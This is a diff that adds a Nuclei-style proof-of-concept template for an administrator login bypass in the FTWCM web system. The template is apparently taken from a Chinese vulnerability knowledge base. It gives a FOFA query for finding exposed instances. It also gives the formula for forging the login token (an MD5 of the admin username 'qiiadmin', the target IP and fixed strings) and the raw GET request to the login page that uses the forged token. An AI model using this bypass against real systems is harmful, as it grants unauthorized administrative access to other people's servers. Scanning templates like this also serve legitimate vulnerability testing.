@@ -1,0 +1,32 @@
+id: poc-lwnhx23ebuohwk3s
+info:
+  name: FTWCM存在管理员登录绕过
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lwnhx23ebuohwk3s'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lwnhx23ebuohwk3s
+    fofa: title="ftwcm"
+http:
+- raw:
+  - 'token计算: md5("1/qiiadmin/从URL中提取IP地址/logincheck/subdomain")
+
+    比如：md5("1/qiiadmin/101.xxx.xxx.111/logincheck/subdomain")
+
+
+    GET /Webgroup/Index/login.html?user=qiiadmin&stime=1&token=<计算出的token值> HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3096.117 Safari/537.36
+
+    Referer: {{url}}
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
